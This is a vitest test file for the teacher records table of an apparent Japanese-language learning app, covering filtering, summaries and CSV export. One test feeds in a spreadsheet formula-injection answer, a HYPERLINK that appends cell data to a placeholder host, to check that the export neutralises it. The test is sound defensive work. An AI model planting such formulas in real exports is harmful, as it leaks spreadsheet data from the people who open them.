import { describe, expect, it } from "vitest";
import type { ProfileRow } from "../src/lib/profile-db";
import {
  buildLookups,
  buildRecordsCsv,
  defaultKind,
  EMPTY_FILTER,
  filterRows,
  kindsWithRecords,
  listeningTable,
  matchesProfile,
  progressTable,
  quizTable,
  summaryTable,
  talkTable,
  unitsWithRecords,
  wordTable,
} from "../src/lib/records/table";
import type { RecordIndexRow } from "../src/lib/records/records-db";
import type { UnitRef } from "../src/lib/records/units";

function profile(over: Partial<ProfileRow> & { id: string }): ProfileRow {
  return {
    email: `${over.id}@example.com`,
    display_name: over.id,
    family_name: "",
    given_name: "",
    nickname: "",
    university: "AUPP",
    cohort: 1,
    gender: null,
    personality_type: null,
    answers: [],
    scores: {} as ProfileRow["scores"],
    personality_version: 3,
    answer_language: null,
    language_switched: false,
    is_admin: false,
    created_at: "2026-09-01T00:00:00.000Z",
    updated_at: "2026-09-01T00:00:00.000Z",
    ...over,
  };
}

const AYA = profile({ id: "aya", display_name: "アヤ", university: "AUPP", cohort: 1 });
const BOPHA = profile({ id: "bopha", display_name: "ボパー", university: "CADT", cohort: 2 });
const NOSCHOOL = profile({ id: "sok", display_name: "ソック", university: "", cohort: 0 });

const UNITS: UnitRef[] = [
  {
    id: "asakai-manga",
    type: "manga",
    title: "朝会の まんが",
    stageId: "asakai",
    stageTitle: "朝会",
    order: 0,
  },
  {
    id: "houkoku-quiz",
    type: "quizset",
    title: "報告の もんだい",
    stageId: "houkoku",
    stageTitle: "報告",
    order: 1,
  },
];

/**
 * 問いの 文（`loadUnitIndex` が 教材から 引いた もの）。鍵は `<教材id>:<問いid>`。
 * これが 無いと 先生の 画面は `q1-1` のような id しか 出せない。
 */
const PROMPTS = {
  "houkoku-quiz:q1-1": "なぜ そう 思いましたか",
  "houkoku-meeting:q1": "きのうは 何を しましたか",
  "kaisha-talk:r3": "よさん",
  /*
   * 対話ゲーム（松井社長）は **ばん＋何手目**で 引く。`attempt` が この 教材では
   * 言い直しの 回数では なく 何手目か だから（`loadUnitIndex` が 作る 鍵）。
   */
  "kaisha-talkgame:talk:talk#2": "NEXT MAKEで、どんな 仕事を やって みたいですか。",
  "kaisha-talkgame:talk:listen": "では、こんどは あなたの ばんです。",
};

const LOOKUPS = buildLookups([AYA, BOPHA, NOSCHOOL], UNITS, PROMPTS);

describe("学習のきろくを1つの表にそろえる", () => {
  it("先頭の5列は だれ・どこ（種類が変わっても同じ）", () => {
    const table = progressTable(
      [
        {
          profile_id: "aya",
          content_id: "asakai-manga",
          status: "completed",
          position: { page: 4 },
          started_at: "2026-09-02T01:00:00.000Z",
          completed_at: "2026-09-02T01:20:00.000Z",
          updated_at: "2026-09-02T01:20:00.000Z",
        },
      ],
      LOOKUPS,
    );
    expect(table.columns.slice(0, 5).map((c) => c.key)).toEqual([
      "student",
      "school",
      "stage",
      "unit",
      "type",
    ]);
    expect(table.rows[0]?.cells).toMatchObject({
      student: "アヤ",
      school: "AUPP 1期生",
      stage: "朝会",
      unit: "朝会の まんが",
      type: "まんが",
      status: "おわった",
      position: "page=4",
    });
  });

  it("台帳に無い教材でも 行は消さない（無いことと 引けないことは別）", () => {
    const table = progressTable(
      [
        {
          profile_id: "aya",
          content_id: "けした-きょうざい",
          status: "started",
          position: null,
          started_at: "2026-09-02T01:00:00.000Z",
          completed_at: null,
          updated_at: "2026-09-02T01:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    expect(table.rows).toHaveLength(1);
    expect(table.rows[0]?.cells.unit).toBe("けした-きょうざい");
  });

  it("もんだいは 何も書かずに 出したことも 分かるようにする", () => {
    const table = quizTable(
      [
        {
          id: "1",
          profile_id: "aya",
          quiz_set_id: "houkoku-quiz",
          question_id: "q3",
          question_type: "keyword",
          answer_text: "",
          correct: false,
          earned: 0,
          max_points: 2,
          question_index: 2,
          full_set: true,
          attempt_id: "abcdef01-0000-4000-a000-000000000000",
          created_at: "2026-09-02T02:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    expect(table.rows[0]?.cells).toMatchObject({
      question: "Q3 q3",
      answer: "（書いて いません）",
      correct: "×",
      points: "0/2",
    });
  });

  it("ことばのテストは 打った読みと 聞いていないことを 見分ける", () => {
    const table = wordTable(
      [
        {
          id: "a1",
          profile_id: "aya",
          stage_id: "asakai-words",
          attempt_id: "att-1",
          word_id: "w1",
          term: "研修",
          reading: "けんしゅう",
          meaning: "training",
          reading_input: "けんしゅ",
          reading_ok: false,
          meaning_input: "training",
          meaning_ok: true,
          word_index: 0,
          created_at: "2026-09-02T03:00:00.000Z",
        },
        {
          id: "a2",
          profile_id: "aya",
          stage_id: "asakai-words",
          attempt_id: "att-1",
          word_id: "w2",
          term: "出社",
          reading: "しゅっしゃ",
          meaning: "going to work",
          reading_input: "",
          reading_ok: null,
          meaning_input: "",
          meaning_ok: false,
          word_index: 1,
          created_at: "2026-09-02T03:01:00.000Z",
        },
      ],
      [
        {
          id: "r1",
          profile_id: "aya",
          stage_id: "asakai-words",
          attempt_id: "att-1",
          mode: "test",
          score: 3,
          max_score: 4,
          total: 2,
          reading_asked: 1,
          reading_correct: 0,
          meaning_correct: 1,
          passed: false,
          game_score: 0,
          best_combo: 1,
          created_at: "2026-09-02T03:02:00.000Z",
        },
      ],
      LOOKUPS,
    );
    expect(table.rows[0]?.cells).toMatchObject({
      word: "研修",
      readingInput: "けんしゅ",
      readingOk: "×",
      mode: "テスト",
      score: "3/4",
      passed: "もう いちど",
    });
    // 読みを 聞いていない 語は「—」。0点 と 見分ける
    expect(table.rows[1]?.cells).toMatchObject({
      readingOk: "—",
      readingInput: "（打って いません）",
      meaningInput: "（時間ぎれ）",
    });
  });

  it("れんしゅうの行に 不合格と 出さない", () => {
    const table = wordTable(
      [
        {
          id: "a1",
          profile_id: "aya",
          stage_id: "asakai-words",
          attempt_id: "att-2",
          word_id: "w1",
          term: "研修",
          reading: "けんしゅう",
          meaning: "training",
          reading_input: "けんしゅう",
          reading_ok: true,
          meaning_input: "training",
          meaning_ok: true,
          word_index: 0,
          created_at: "2026-09-02T03:00:00.000Z",
        },
      ],
      [
        {
          id: "r2",
          profile_id: "aya",
          stage_id: "asakai-words",
          attempt_id: "att-2",
          mode: "practice",
          score: 2,
          max_score: 2,
          total: 1,
          reading_asked: 1,
          reading_correct: 1,
          meaning_correct: 1,
          passed: false,
          game_score: 300,
          best_combo: 2,
          created_at: "2026-09-02T03:02:00.000Z",
        },
      ],
      LOOKUPS,
    );
    expect(table.rows[0]?.cells.passed).toBe("—");
  });

  it("会話は ミーティングと たいわ を 1つの表にする", () => {
    const table = talkTable(
      [
        {
          id: "m1",
          profile_id: "aya",
          meeting_id: "houkoku-meeting",
          question_id: "q1",
          attempt: 2,
          mode: "voice",
          utterance: "きのう けんしゅうに 行きました",
          judge: { reply: "そうなんですね", praise: "はっきり 言えました", fix: "" },
          grade: "good",
          fallback: "none",
          created_at: "2026-09-02T04:00:00.000Z",
        },
      ],
      [
        {
          id: "t1",
          profile_id: "bopha",
          talk_id: "kaisha-talk",
          session_id: "s1",
          turn_index: 0,
          speaker: "partner",
          mode: "voice",
          body: "はじめまして",
          opened_req_id: "",
          opened_count: 0,
          req_total: 5,
          created_at: "2026-09-02T05:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    expect(table.rows.map((row) => row.cells.kind)).toEqual(["ミーティング", "たいわ"]);
    expect(table.rows[0]?.cells).toMatchObject({
      speaker: "学生",
      note: "つたわった",
      way: "こえ",
    });
    expect(table.rows[1]?.cells).toMatchObject({ speaker: "あいて", note: "0/5 聞き出せた" });
  });

  it("AIに通せなかった回は そう書く（見かたが空なのと 別物）", () => {
    const table = talkTable(
      [
        {
          id: "m1",
          profile_id: "aya",
          meeting_id: "houkoku-meeting",
          question_id: "q1",
          attempt: 1,
          mode: "text",
          utterance: "はい",
          judge: null,
          grade: null,
          fallback: "quota",
          created_at: "2026-09-02T04:00:00.000Z",
        },
      ],
      [],
      LOOKUPS,
    );
    expect(table.rows[0]?.cells.note).toBe("（AIなし: quota）");
  });
});

describe("絞り込み", () => {
  const table = progressTable(
    [
      {
        profile_id: "aya",
        content_id: "asakai-manga",
        status: "started",
        position: null,
        started_at: "2026-09-02T01:00:00.000Z",
        completed_at: null,
        updated_at: "2026-09-02T01:00:00.000Z",
      },
      {
        profile_id: "bopha",
        content_id: "houkoku-quiz",
        status: "completed",
        position: null,
        started_at: "2026-09-03T01:00:00.000Z",
        completed_at: "2026-09-03T01:00:00.000Z",
        updated_at: "2026-09-03T01:00:00.000Z",
      },
    ],
    LOOKUPS,
  );

  it("学校で 分ける", () => {
    const rows = filterRows(table, { ...EMPTY_FILTER, university: "CADT" }, LOOKUPS);
    expect(rows.map((row) => row.profileId)).toEqual(["bopha"]);
  });

  it("期生で 分ける", () => {
    expect(
      filterRows(table, { ...EMPTY_FILTER, cohort: 1 }, LOOKUPS).map((row) => row.profileId),
    ).toEqual(["aya"]);
  });

  it("未設定の人だけを 探せる", () => {
    expect(matchesProfile(NOSCHOOL, { ...EMPTY_FILTER, cohort: -1 })).toBe(true);
    expect(matchesProfile(AYA, { ...EMPTY_FILTER, cohort: -1 })).toBe(false);
  });

  it("メンバー・ステージ・単元で 分ける", () => {
    expect(
      filterRows(table, { ...EMPTY_FILTER, profileId: "aya" }, LOOKUPS).map((r) => r.unitId),
    ).toEqual(["asakai-manga"]);
    expect(
      filterRows(table, { ...EMPTY_FILTER, stageId: "houkoku" }, LOOKUPS).map((r) => r.unitId),
    ).toEqual(["houkoku-quiz"]);
    expect(filterRows(table, { ...EMPTY_FILTER, unitId: "asakai-manga" }, LOOKUPS)).toHaveLength(1);
  });

  it("ことばで さがす（学生の名前も こたえも）", () => {
    expect(filterRows(table, { ...EMPTY_FILTER, text: "ボパー" }, LOOKUPS)).toHaveLength(1);
    expect(filterRows(table, { ...EMPTY_FILTER, text: "いない人" }, LOOKUPS)).toHaveLength(0);
  });

  it("新しい ものが 上（先生が 開くのは 授業の 直後）", () => {
    expect(filterRows(table, EMPTY_FILTER, LOOKUPS).map((row) => row.profileId)).toEqual([
      "bopha",
      "aya",
    ]);
  });
});

describe("CSV", () => {
  it("見えている 表を そのまま 出す（BOM つき・CRLF）", () => {
    const table = listeningTable(
      [
        {
          profile_id: "aya",
          listening_id: "asakai-listening",
          inputs: ["けんしゅう"],
          reveal_percent: 20,
          keywords_left: 3,
          updated_at: "2026-09-02T06:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    const csv = buildRecordsCsv(table.columns, filterRows(table, EMPTY_FILTER, LOOKUPS));
    expect(csv.startsWith("﻿")).toBe(true);
    const [header, row] = csv.slice(1).split("\r\n");
    expect(header?.startsWith("学生,所属,ステージ,単元,種別")).toBe(true);
    expect(row?.startsWith("アヤ,AUPP 1期生")).toBe(true);
  });

  it("数式に 見える こたえを、先生の Excel が 実行しない", () => {
    const table = quizTable(
      [
        {
          id: "1",
          profile_id: "aya",
          quiz_set_id: "houkoku-quiz",
          question_id: "q1",
          question_type: "keyword",
          answer_text: '=HYPERLINK("http://example.invalid/"&A2,"OK")',
          correct: false,
          earned: 0,
          max_points: 2,
          question_index: 0,
          full_set: true,
          attempt_id: "abcdef01-0000-4000-a000-000000000000",
          created_at: "2026-09-02T02:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    const csv = buildRecordsCsv(table.columns, table.rows);
    // 先頭に ' が 付き、数式では なく 文字として 読まれる
    expect(csv).toContain("\"'=HYPERLINK(");
    expect(csv).not.toContain(",=HYPERLINK(");
  });

  it("カンマ・引用符・改行を 含む こたえを 壊さない", () => {
    const table = quizTable(
      [
        {
          id: "1",
          profile_id: "aya",
          quiz_set_id: "houkoku-quiz",
          question_id: "q1",
          question_type: "keyword",
          answer_text: 'A, B と "C"\nつぎの行',
          correct: true,
          earned: 2,
          max_points: 2,
          question_index: 0,
          full_set: true,
          attempt_id: "abcdef01-0000-4000-a000-000000000000",
          created_at: "2026-09-02T02:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    const csv = buildRecordsCsv(table.columns, table.rows);
    expect(csv).toContain('"A, B と ""C""\nつぎの行"');
  });
});

/* ------------------------------------------------------------------ *
 * つまずき（まとめ）
 *
 * 畳んだ 2画面（`/admin/meetings`・`/admin/quizzes`）が いちばん 上に 置いて いた もの。
 * **並びが 崩れると 直す順が 読み取れなく なる**ので、並びと 数えかたを ここで 固定する
 *（削除した tests/meeting_logs.test.ts が 守って いた 約束を 引き継ぐ）。
 * ------------------------------------------------------------------ */

function quizRow(over: Partial<Parameters<typeof quizTable>[0][number]>) {
  return {
    id: Math.random().toString(36).slice(2),
    profile_id: "aya",
    quiz_set_id: "houkoku-quiz",
    question_id: "q1",
    question_type: "keyword",
    answer_text: "",
    correct: true,
    earned: 1,
    max_points: 1,
    question_index: 0,
    full_set: true,
    attempt_id: "att-1",
    created_at: "2026-09-02T02:00:00.000Z",
    ...over,
  };
}

function meetingRow(over: Partial<Parameters<typeof talkTable>[0][number]>) {
  return {
    id: Math.random().toString(36).slice(2),
    profile_id: "aya",
    meeting_id: "houkoku-meeting",
    question_id: "q1",
    attempt: 1,
    mode: "text" as const,
    utterance: "はい",
    judge: null,
    grade: null,
    fallback: "none",
    created_at: "2026-09-02T04:00:00.000Z",
    ...over,
  };
}

function talkRow(over: Partial<Parameters<typeof talkTable>[1][number]>) {
  return {
    id: Math.random().toString(36).slice(2),
    profile_id: "aya",
    talk_id: "kaisha-talk",
    session_id: "s1",
    turn_index: 0,
    speaker: "learner" as const,
    mode: "text" as const,
    body: "はい",
    opened_req_id: "",
    opened_count: 0,
    req_total: 5,
    created_at: "2026-09-02T05:00:00.000Z",
    ...over,
  };
}

describe("つまずきの まとめ", () => {
  it("もんだいは 正答率の ひくい順（直す順が 上から 読める）", () => {
    const table = quizTable(
      [
        quizRow({ question_id: "easy", question_index: 0, correct: true }),
        quizRow({ question_id: "easy", question_index: 0, correct: true, profile_id: "bopha" }),
        quizRow({
          question_id: "hard",
          question_index: 1,
          correct: false,
          answer_text: "けんしゅ",
        }),
        quizRow({
          question_id: "hard",
          question_index: 1,
          correct: false,
          answer_text: "けんしゅ",
          profile_id: "bopha",
        }),
      ],
      LOOKUPS,
    );
    const summary = summaryTable("quiz", table.rows)!;
    expect(summary.rows.map((row) => row.cells.group)).toEqual(["Q2 hard", "Q1 easy"]);
    expect(summary.rows[0]?.cells).toMatchObject({
      answered: "2",
      correct: "0",
      rate: "0%",
      people: "2",
      // まちがえた こたえは 多い順（書き方の ゆれが ここで 見つかる）
      misses: "けんしゅ（2）",
    });
  });

  it("何も 書かずに こたえを 見た のも まちがいとして 数える（そこで 詰まった 証拠）", () => {
    const table = quizTable([quizRow({ correct: false, answer_text: "" })], LOOKUPS);
    expect(summaryTable("quiz", table.rows)?.rows[0]?.cells.misses).toBe(
      "（書いて いません）（1）",
    );
  });

  it("会話は「もう いちど」の 多い順（ヒントの 作りを 疑う 順）", () => {
    const table = talkTable(
      [
        meetingRow({ question_id: "ok", grade: "veryGood" }),
        meetingRow({ question_id: "stuck", grade: "miss" }),
        meetingRow({ question_id: "stuck", grade: "miss", attempt: 2 }),
        meetingRow({ question_id: "stuck", grade: null, fallback: "quota" }),
      ],
      [],
      LOOKUPS,
    );
    const summary = summaryTable("talk", table.rows)!;
    expect(summary.rows.map((row) => row.cells.group)).toEqual(["stuck", "ok"]);
    expect(summary.rows[0]?.cells).toMatchObject({
      turns: "2",
      miss: "2",
      retried: "1",
    });
    // AIに 通せなかった 回は 見かたが 空なので、まとめの 母数には 入れない
    expect(summary.rows[0]?.cells.veryGood).toBe("0");
  });

  it("たいわ は つまずきの まとめに 出さない（三段の 評価で 進む 教材では ない）", () => {
    const table = talkTable(
      [],
      [
        {
          id: "t1",
          profile_id: "aya",
          talk_id: "kaisha-talk",
          session_id: "s1",
          turn_index: 0,
          speaker: "learner",
          mode: "voice",
          body: "よさんは いくらですか",
          opened_req_id: "budget",
          opened_count: 1,
          req_total: 5,
          created_at: "2026-09-02T05:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    // 明細には 出る（手ごたえは「見かた」列で 読む）
    expect(table.rows[0]?.cells.note).toBe("1/5 聞き出せた");
    // まとめには 出ない——「聞き出せた＝すばらしい」と 読み替えると 全部 すばらしいに なる
    expect(summaryTable("talk", table.rows)).toBeNull();
  });

  it("進み具合は おわった率の ひくい順（まだ 誰も 終えて いない 教材が 上）", () => {
    const table = progressTable(
      [
        {
          profile_id: "aya",
          content_id: "asakai-manga",
          status: "completed",
          position: null,
          started_at: "2026-09-02T01:00:00.000Z",
          completed_at: "2026-09-02T01:00:00.000Z",
          updated_at: "2026-09-02T01:00:00.000Z",
        },
        {
          profile_id: "aya",
          content_id: "houkoku-quiz",
          status: "started",
          position: null,
          started_at: "2026-09-02T01:00:00.000Z",
          completed_at: null,
          updated_at: "2026-09-02T01:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    const summary = summaryTable("progress", table.rows)!;
    expect(summary.rows.map((row) => row.cells.group)).toEqual([
      "報告の もんだい",
      "朝会の まんが",
    ]);
    expect(summary.rows[0]?.cells).toMatchObject({ opened: "1", done: "0", rate: "0%" });
  });

  it("ことばは 読みと いみの 両方 合って はじめて できた", () => {
    const table = wordTable(
      [
        {
          id: "a1",
          profile_id: "aya",
          stage_id: "kaisha",
          attempt_id: "att-1",
          word_id: "w1",
          term: "研修",
          reading: "けんしゅう",
          meaning: "training",
          reading_input: "けんしゅ",
          reading_ok: false,
          meaning_input: "training",
          // いみは 合って いるが 読みを 外した ＝ できて いない
          meaning_ok: true,
          word_index: 0,
          created_at: "2026-09-02T03:00:00.000Z",
        },
      ],
      [],
      LOOKUPS,
    );
    const summary = summaryTable("word", table.rows)!;
    expect(summary.rows[0]?.cells).toMatchObject({
      group: "研修",
      correct: "0",
      rate: "0%",
      // 打った 読みが そのまま 出る（長音の 教え方を 疑う 手がかり）
      misses: "けんしゅ（1）",
    });
  });

  it("数える ものが 無ければ まとめは 出さない", () => {
    expect(summaryTable("quiz", [])).toBeNull();
  });

  it("絞り込んだ あとの 行から 数える（畳む 前は 全員ぶんしか 出せなかった）", () => {
    const table = quizTable(
      [
        quizRow({ profile_id: "aya", correct: false }),
        quizRow({ profile_id: "bopha", correct: true }),
      ],
      LOOKUPS,
    );
    const onlyAya = filterRows(table, { ...EMPTY_FILTER, profileId: "aya" }, LOOKUPS);
    expect(summaryTable("quiz", onlyAya)?.rows[0]?.cells).toMatchObject({
      answered: "1",
      rate: "0%",
    });
  });
});

/* ------------------------------------------------------------------ *
 * 問いの 文と 紐づける（2026-09-05 の 指定）
 *
 * 台帳は id しか 持たない（教材を 直しても 去年の 記録が 読める ように）。
 * 先生の 画面を 開く ときに 教材から 引き直す——その 引き直しを ここで 固定する。
 * ------------------------------------------------------------------ */

describe("問いの 文を 出す", () => {
  it("もんだいは 設問文そのものを 出す（id では 中身が 見えない）", () => {
    const table = quizTable([quizRow({ question_id: "q1-1", question_index: 0 })], LOOKUPS);
    expect(table.rows[0]?.cells.question).toBe("Q1 なぜ そう 思いましたか");
  });

  it("ミーティングは ヘンディさんの しつもんを 出す", () => {
    const table = talkTable([meetingRow({ question_id: "q1" })], [], LOOKUPS);
    // 2026-09-09 に **列が 移った**（`topic` の 9列目 → `ask` の 6列目）。
    // 引き直す ところは 同じ。学生の 答えの となりで 読める ように しただけ。
    expect(table.rows[0]?.cells.ask).toBe("きのうは 何を しましたか");
  });

  it("台帳に 残った しつもんが 教材より 先（松井社長の たいわ は 引き直せない）", () => {
    const table = talkTable(
      [
        meetingRow({
          meeting_id: "kaisha-talkgame",
          question_id: "talk:talk",
          ask: "その 会社の どこが おもしろいと 思いましたか",
        }),
      ],
      [],
      LOOKUPS,
    );
    expect(table.rows[0]?.cells.ask).toBe("その 会社の どこが おもしろいと 思いましたか");
  });

  it("対話ゲームは 何手目かで 出だしの しつもんを 引き当てる（attempt = 手数）", () => {
    const table = talkTable(
      [meetingRow({ meeting_id: "kaisha-talkgame", question_id: "talk:talk", attempt: 2 })],
      [],
      LOOKUPS,
    );
    expect(table.rows[0]?.cells.ask).toBe("NEXT MAKEで、どんな 仕事を やって みたいですか。");
  });

  it("聞く ばんは うながしの 文（手数では 分かれない）", () => {
    const table = talkTable(
      [meetingRow({ meeting_id: "kaisha-talkgame", question_id: "talk:listen", attempt: 6 })],
      [],
      LOOKUPS,
    );
    expect(table.rows[0]?.cells.ask).toBe("では、こんどは あなたの ばんです。");
  });

  it("出だしを 使いきった あとの 深掘りは 空に する（予備の 文で 埋めない）", () => {
    // AIが その場で 作る しつもんは 教材に 無い。**聞かれて いない 文**を 出すより 空。
    const table = talkTable(
      [meetingRow({ meeting_id: "kaisha-talkgame", question_id: "talk:talk", attempt: 9 })],
      [],
      LOOKUPS,
    );
    expect(table.rows[0]?.cells.ask).toBe("");
  });

  it("たいわ は 直前に 相手が 言った ことを しつもんに する", () => {
    const table = talkTable(
      [],
      [
        talkRow({
          id: "t1",
          turn_index: 0,
          speaker: "partner",
          body: "よさんは まだ 決めて いません",
        }),
        talkRow({ id: "t2", turn_index: 1, speaker: "learner", body: "よさんは いくらですか" }),
      ],
      LOOKUPS,
    );
    const learner = table.rows.find((row) => row.cells.speaker === "学生");
    const partner = table.rows.find((row) => row.cells.speaker === "あいて");
    expect(learner?.cells.ask).toBe("よさんは まだ 決めて いません");
    // 相手の 行そのものは しつもん なので、同じ 文を 2回 並べない
    expect(partner?.cells.ask).toBe("");
  });

  it("たいわは 要件ボードの 見出しを 出す", () => {
    const table = talkTable(
      [],
      [
        {
          id: "t1",
          profile_id: "aya",
          talk_id: "kaisha-talk",
          session_id: "s1",
          turn_index: 0,
          speaker: "learner",
          mode: "voice",
          body: "よさんは いくらですか",
          opened_req_id: "r3",
          opened_count: 1,
          req_total: 5,
          created_at: "2026-09-02T05:00:00.000Z",
        },
      ],
      LOOKUPS,
    );
    expect(table.rows[0]?.cells.topic).toBe("聞き出せた: よさん");
  });

  it("つまずきの まとめにも 文が 出る（並べ替えの 見出しが 読める）", () => {
    const table = quizTable(
      [quizRow({ question_id: "q1-1", question_index: 0, correct: false })],
      LOOKUPS,
    );
    expect(summaryTable("quiz", table.rows)?.rows[0]?.cells.group).toBe(
      "Q1 なぜ そう 思いましたか",
    );
  });

  it("教材から 消した 問いは id が そのまま 出る（行ごと 消さない）", () => {
    const table = quizTable([quizRow({ question_id: "けした-とい", question_index: 4 })], LOOKUPS);
    expect(table.rows[0]?.cells.question).toBe("Q5 けした-とい");
    // 記録は 残って いるので、まとめからも 落とさない
    expect(summaryTable("quiz", table.rows)?.rows).toHaveLength(1);
  });

  it("問いの id は 教材の 中でしか 一意で ないので、教材と 組で 引く", () => {
    // 別の 教材の 同じ id（`q1-1`）を 引いても、こちらの 文は 出ない
    const table = quizTable(
      [quizRow({ quiz_set_id: "hoka-quiz", question_id: "q1-1", question_index: 0 })],
      LOOKUPS,
    );
    expect(table.rows[0]?.cells.question).toBe("Q1 q1-1");
  });
});

/* ------------------------------------------------------------------ *
 * 見取り図（2026-09-09 の 指定・願い #346）
 *
 * 画面の 順が「絞る → 出た データの 種類を えらぶ」に 変わった。その 判断を する
 * のが ここ。中身は 見ない（件数だけ）ので、素の 表より ずっと 軽い。
 * ------------------------------------------------------------------ */

function indexRow(
  over: Partial<RecordIndexRow> & { unit_id: string; kind: string },
): RecordIndexRow {
  return { profile_id: "aya", n: 1, ...over };
}

describe("どこに 記録が あるか", () => {
  const INDEX: RecordIndexRow[] = [
    indexRow({ kind: "progress", unit_id: "asakai-manga" }),
    indexRow({ kind: "quiz", unit_id: "houkoku-quiz" }),
    indexRow({ kind: "listening", unit_id: "houkoku-quiz", profile_id: "bopha" }),
  ];

  it("記録の ある 単元だけを 返す", () => {
    expect([...unitsWithRecords(INDEX, EMPTY_FILTER, LOOKUPS)].toSorted()).toEqual([
      "asakai-manga",
      "houkoku-quiz",
    ]);
  });

  it("人で 絞ると その子が さわった 単元だけに なる", () => {
    const only = unitsWithRecords(INDEX, { ...EMPTY_FILTER, profileId: "bopha" }, LOOKUPS);
    expect([...only]).toEqual(["houkoku-quiz"]);
  });

  it("種類は 記録の ある ものだけ（ボタンの 並びは そのまま）", () => {
    expect(kindsWithRecords(INDEX, EMPTY_FILTER, LOOKUPS)).toEqual([
      "progress",
      "quiz",
      "listening",
    ]);
  });

  it("単元で 絞ると その 単元に ある 種類だけに なる", () => {
    expect(kindsWithRecords(INDEX, { ...EMPTY_FILTER, unitId: "asakai-manga" }, LOOKUPS)).toEqual([
      "progress",
    ]);
  });

  it("ステージで 絞れる（単元から ステージを 引き直す）", () => {
    expect(kindsWithRecords(INDEX, { ...EMPTY_FILTER, stageId: "houkoku" }, LOOKUPS)).toEqual([
      "quiz",
      "listening",
    ]);
  });

  it("ことばで さがす は 種類を 減らさない（出た 行を 絞る ものだから）", () => {
    expect(kindsWithRecords(INDEX, { ...EMPTY_FILTER, text: "よさん" }, LOOKUPS)).toEqual([
      "progress",
      "quiz",
      "listening",
    ]);
  });

  it("既定は 学生が 入れた ほう（進み具合では ない）", () => {
    expect(defaultKind(["progress", "quiz"])).toBe("quiz");
    expect(defaultKind(["progress"])).toBe("progress");
    // 何も 無い ときも 画面が 座る 先を 返す（表は 空で、画面が そう 言う）
    expect(defaultKind([])).toBe("progress");
  });
});
